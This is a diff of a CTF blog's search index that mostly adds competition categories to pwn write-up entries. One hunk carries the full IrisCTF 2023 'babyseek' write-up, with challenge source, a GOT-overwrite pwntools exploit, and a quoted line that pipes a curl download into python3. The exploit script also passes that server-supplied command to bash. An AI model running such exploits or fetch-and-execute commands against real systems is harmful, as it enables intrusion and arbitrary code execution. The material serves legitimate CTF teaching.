@@ -15,6 +15,8 @@
           
           <category> WriteUp </category>
           
+          <category> Wolve </category>
+          
       </categories>
       
       
@@ -40,6 +42,8 @@
           
           <category> WriteUp </category>
           
+          <category> Wolve </category>
+          
       </categories>
       
       
@@ -64,6 +68,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Wolve </category>
           
       </categories>
       
@@ -92,6 +98,8 @@
           
           <category> WriteUp </category>
           
+          <category> Wolve </category>
+          
       </categories>
       
       
@@ -116,6 +124,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Wolve </category>
           
       </categories>
       
@@ -143,6 +153,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Kalmar </category>
           
       </categories>
       
@@ -200,6 +212,8 @@
           
           <category> WriteUp </category>
           
+          <category> La </category>
+          
       </categories>
       
       
@@ -252,6 +266,8 @@
           
           <category> WriteUp </category>
           
+          <category> La </category>
+          
       </categories>
       
       
@@ -279,6 +295,8 @@
           
           <category> WriteUp </category>
           
+          <category> La </category>
+          
       </categories>
       
       
@@ -303,6 +321,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> La </category>
           
       </categories>
       
@@ -329,6 +349,8 @@
           
           <category> WriteUp </category>
           
+          <category> La </category>
+          
       </categories>
       
       
@@ -348,6 +370,8 @@
           
           <category> WriteUp </category>
           
+          <category> La </category>
+          
       </categories>
       
       
@@ -356,7 +380,7 @@
     
     
     <entry>
-      <title>Winter HackingCamp CTF 2023 - syscall (SROP)</title>
+      <title>(author) Winter HackingCamp CTF 2023 - syscall (SROP)</title>
       <link href="/230211-hcamp2023w-syscall/"/>
       <url>/230211-hcamp2023w-syscall/</url>
       
@@ -367,7 +391,7 @@
           
           <category> WriteUp </category>
           
-          <category> Making </category>
+          <category> HCAMP </category>
           
       </categories>
       
@@ -398,6 +422,8 @@
           
           <category> WriteUp </category>
           
+          <category> HCAMP </category>
+          
       </categories>
       
       
@@ -426,6 +452,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Dice </category>
           
       </categories>
       
@@ -684,6 +712,8 @@
           
           <category> WriteUp </category>
           
+          <category> idek </category>
+          
       </categories>
       
       
@@ -708,6 +738,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> idek </category>
           
       </categories>
       
@@ -734,6 +766,8 @@
           
           <category> WriteUp </category>
           
+          <category> idek </category>
+          
       </categories>
       
       
@@ -752,12 +786,14 @@
       <link href="/230109-irisctf2023-babyseek/"/>
       <url>/230109-irisctf2023-babyseek/</url>
       
-        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>86 Solves (8.4% of users)<br>167 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I’ll let you seek around my file as far as you want, but you can’t go anywhere since it’s &#x2F;dev&#x2F;null.<br><code>nc ret2libm.chal.irisc.tf 10004</code></p><p>To figure out where things are, you can use the gdb debugger. I recommend using a Docker instance, such as with the Dockerfile provided, to ensure you have an environment that matches the remote server you are attacking.</p><p>Hint!<br>You can find the location of functions in the Global Offset Table by using their name followed by @got.plt - for example, print &amp;‘<a href="mailto:&#x66;&#x77;&#x72;&#x69;&#116;&#101;&#64;&#103;&#x6f;&#116;&#46;&#x70;&#x6c;&#116;">&#x66;&#x77;&#x72;&#x69;&#116;&#101;&#64;&#103;&#x6f;&#116;&#46;&#x70;&#x6c;&#116;</a>‘.</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal</span><br><span class="line">├── chal.c</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25a1bb094d7ba8684d70c7686826e67352ceaf0b, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>This challenge have a source code, So we can view the original source code ! :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// This is just setup</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is located around %p.\n&quot;</span>, win);</span><br><span class="line"></span><br><span class="line">    FILE* null = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* super_special = &amp;win;</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;void&quot;</span>, <span class="number">1</span>, <span class="number">4</span>, null);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m currently at %p.\n&quot;</span>, null-&gt;_IO_write_ptr); <span class="comment">// [*]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll let you write the flag into nowhere!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where should I seek into? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pos);</span><br><span class="line">    null-&gt;_IO_write_ptr += pos; <span class="comment">// [**]</span></span><br><span class="line"></span><br><span class="line">    fwrite(&amp;super_special, <span class="keyword">sizeof</span>(<span class="type">void</span>*), <span class="number">1</span>, null);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nice <code>win()</code> function which prints the flag. I like it.</p><p>Let’s see the <code>[*]</code> and <code>[**]</code> marking in code. First <code>[*]</code>, The <code>null</code> pointer is points to the <code>_IO_write_ptr</code> member of a <code>FILE</code> object. It points to the location where the file is being written to in memory. Before <code>[**]</code>, We can write the value to <code>pos</code>. It is add to the <code>null-&gt;_IO_write_ptr</code> at <code>[**]</code>, So <code>pos</code> is mean the offset.</p><p>The <code>frwite()</code> function attempt to write address of the <code>win()</code> to that offset, and then <code>exit()</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We can move the pointer that the file is being written to in memory.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Let’s overwrite the <code>GOT</code> of <code>exit()</code> which is called write after. We calculate the offset of <code>win()</code> to <code>exit@got.plt</code>.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;seek.chal.irisc.tf&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;located around&#x27;</span>)</span><br><span class="line">win = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;win: &#x27;</span>+ <span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">e.address = win - e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;currently at&#x27;</span>)</span><br><span class="line">curr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;curr: &#x27;</span> + <span class="built_in">hex</span>(curr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># move pos to exit@got</span></span><br><span class="line">offset = e.got[<span class="string">&#x27;exit&#x27;</span>] - curr</span><br><span class="line">info(<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;into?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;not_quite_fseek&#125;</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>86 Solves (8.4% of users)<br>167 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I’ll let you seek around my file as far as you want, but you can’t go anywhere since it’s &#x2F;dev&#x2F;null.<br><code>nc ret2libm.chal.irisc.tf 10004</code></p><p>To figure out where things are, you can use the gdb debugger. I recommend using a Docker instance, such as with the Dockerfile provided, to ensure you have an environment that matches the remote server you are attacking.</p><p>Hint!<br>You can find the location of functions in the Global Offset Table by using their name followed by @got.plt - for example, print &amp;‘<a href="mailto:&#x66;&#119;&#114;&#105;&#116;&#x65;&#x40;&#103;&#111;&#116;&#46;&#x70;&#108;&#116;">&#x66;&#119;&#114;&#105;&#116;&#x65;&#x40;&#103;&#111;&#116;&#46;&#x70;&#108;&#116;</a>‘.</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chal</span><br><span class="line">├── chal.c</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=25a1bb094d7ba8684d70c7686826e67352ceaf0b, for GNU/Linux 3.2.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>This challenge have a source code, So we can view the original source code ! :)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="comment">// This is just setup</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your flag is located around %p.\n&quot;</span>, win);</span><br><span class="line"></span><br><span class="line">    FILE* null = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">void</span>* super_special = &amp;win;</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;void&quot;</span>, <span class="number">1</span>, <span class="number">4</span>, null);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m currently at %p.\n&quot;</span>, null-&gt;_IO_write_ptr); <span class="comment">// [*]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ll let you write the flag into nowhere!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Where should I seek into? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pos);</span><br><span class="line">    null-&gt;_IO_write_ptr += pos; <span class="comment">// [**]</span></span><br><span class="line"></span><br><span class="line">    fwrite(&amp;super_special, <span class="keyword">sizeof</span>(<span class="type">void</span>*), <span class="number">1</span>, null);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nice <code>win()</code> function which prints the flag. I like it.</p><p>Let’s see the <code>[*]</code> and <code>[**]</code> marking in code. First <code>[*]</code>, The <code>null</code> pointer is points to the <code>_IO_write_ptr</code> member of a <code>FILE</code> object. It points to the location where the file is being written to in memory. Before <code>[**]</code>, We can write the value to <code>pos</code>. It is add to the <code>null-&gt;_IO_write_ptr</code> at <code>[**]</code>, So <code>pos</code> is mean the offset.</p><p>The <code>frwite()</code> function attempt to write address of the <code>win()</code> to that offset, and then <code>exit()</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We can move the pointer that the file is being written to in memory.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Let’s overwrite the <code>GOT</code> of <code>exit()</code> which is called write after. We calculate the offset of <code>win()</code> to <code>exit@got.plt</code>.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;seek.chal.irisc.tf&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;located around&#x27;</span>)</span><br><span class="line">win = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;win: &#x27;</span>+ <span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">e.address = win - e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;currently at&#x27;</span>)</span><br><span class="line">curr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;curr: &#x27;</span> + <span class="built_in">hex</span>(curr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># move pos to exit@got</span></span><br><span class="line">offset = e.got[<span class="string">&#x27;exit&#x27;</span>] - curr</span><br><span class="line">info(<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;into?&#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;not_quite_fseek&#125;</span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Iris </category>
           
       </categories>
       
@@ -778,6 +814,8 @@
           
           <category> WriteUp </category>
           
+          <category> Iris </category>
+          
       </categories>
       
       
@@ -796,6 +834,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Iris </category>
           
       </categories>
       
@@ -841,6 +881,8 @@
           
           <category> WriteUp </category>
           
+          <category> Shakti </category>
+          
       </categories>
       
       
@@ -859,6 +901,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Shakti </category>
           
       </categories>
       
@@ -885,6 +929,8 @@
           
           <category> WriteUp </category>
           
+          <category> Shakti </category>
+          
       </categories>
       
       
@@ -910,6 +956,8 @@
           
           <category> WriteUp </category>
           
+          <category> Sunshine </category>
+          
       </categories>
       
       
@@ -928,6 +976,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Sunshine </category>
           
       </categories>
       
@@ -975,6 +1025,8 @@
           
           <category> WriteUp </category>
           
+          <category> Sunshine </category>
+          
       </categories>
       
       
@@ -1010,7 +1062,7 @@
     
     
     <entry>
-      <title>Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
+      <title>(auther) Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
       <link href="/221121-poxx2022-shop_revenge/"/>
       <url>/221121-poxx2022-shop_revenge/</url>
       
@@ -1021,7 +1073,7 @@
           
           <category> WriteUp </category>
           
-          <category> Making </category>
+          <category> POXX </category>
           
       </categories>
       
@@ -1050,12 +1102,12 @@
           
           <category> WriteUp </category>
           
+          <category> Jade </category>
+          
       </categories>
       
       
         <tags>
-            
-            <tag> Jade CTF </tag>
             
             <tag> Stack pivoting </tag>
             
@@ -1077,12 +1129,12 @@
           
           <category> WriteUp </category>
           
+          <category> Jade </category>
+          
       </categories>
       
       
         <tags>
-            
-            <tag> Jade CTF </tag>
             
             <tag> Shellcode </tag>
             
@@ -1108,6 +1160,8 @@
           
           <category> WriteUp </category>
           
+          <category> Jade </category>
+          
       </categories>
       
       
@@ -1118,8 +1172,6 @@
             <tag> canary </tag>
             
             <tag> pie </tag>
-            
-            <tag> Jade CTF </tag>
             
         </tags>
       
@@ -1168,6 +1220,8 @@
           
           <category> WriteUp </category>
           
+          <category> ASIS </category>
+          
       </categories>
       
       
@@ -1176,8 +1230,6 @@
             <tag> fsb </tag>
             
             <tag> scanf </tag>
-            
-            <tag> ASIS CTF </tag>
             
         </tags>
       
@@ -1197,12 +1249,12 @@
           
           <category> WriteUp </category>
           
+          <category> ASIS </category>
+          
       </categories>
       
       
         <tags>
-            
-            <tag> ASIS CTF </tag>
             
             <tag> one_gadget </tag>
             
@@ -1334,6 +1386,8 @@
           
           <category> WriteUp </category>
           
+          <category> GDG-Algiers </category>
+          
       </categories>
       
       
@@ -1342,8 +1396,6 @@
             <tag> random </tag>
             
             <tag> one_gadget </tag>
-            
-            <tag> GDG Algiers CTF </tag>
             
         </tags>
       
@@ -1363,14 +1415,14 @@
           
           <category> WriteUp </category>
           
+          <category> D-CTF </category>
+          
       </categories>
       
       
         <tags>
             
             <tag> fsb </tag>
-            
-            <tag> D-CTF </tag>
             
             <tag> one_gadget </tag>
             
@@ -1392,6 +1444,8 @@
           
           <category> WriteUp </category>
           
+          <category> D-CTF </category>
+          
       </categories>
       
       
@@ -1400,8 +1454,6 @@
             <tag> seccomp </tag>
             
             <tag> shellcode </tag>
-            
-            <tag> D-CTF </tag>
             
         </tags>
       
@@ -1421,14 +1473,14 @@
           
           <category> WriteUp </category>
           
+          <category> Lake </category>
+          
       </categories>
       
       
         <tags>
             
             <tag> oob </tag>
-            
-            <tag> LakeCTF </tag>
             
             <tag> Dockerfile </tag>
             
@@ -1450,12 +1502,12 @@
           
           <category> WriteUp </category>
           
+          <category> Lake </category>
+          
       </categories>
       
       
         <tags>
-            
-            <tag> LakeCTF </tag>
             
             <tag> z3 </tag>
             
@@ -1478,6 +1530,8 @@
       <categories>
           
           <category> WriteUp </category>
+          
+          <category> Lake </category>
           
       </categories>
       
@@ -1504,6 +1558,8 @@
           
           <category> WriteUp </category>
           
+          <category> Lake </category>
+          
       </categories>
       
       
@@ -1512,8 +1568,6 @@
             <tag> fsb </tag>
             
             <tag> 32bit </tag>
-            
-            <tag> LakeCTF </tag>
             
         </tags>
       
@@ -1533,14 +1587,14 @@
           
           <category> WriteUp </category>
           
+          <category> Cake </category>
+          
       </categories>
       
       
         <tags>
             
             <tag> cpp </tag>
-            
-            <tag> CakeCTF </tag>
             
         </tags>
       
@@ -1560,12 +1614,12 @@
           
           <category> WriteUp </category>
           
+          <category> Cake </category>
+          
       </categories>
       
       
         <tags>
-            
-            <tag> CakeCTF </tag>
             
             <tag> misc </tag>
             
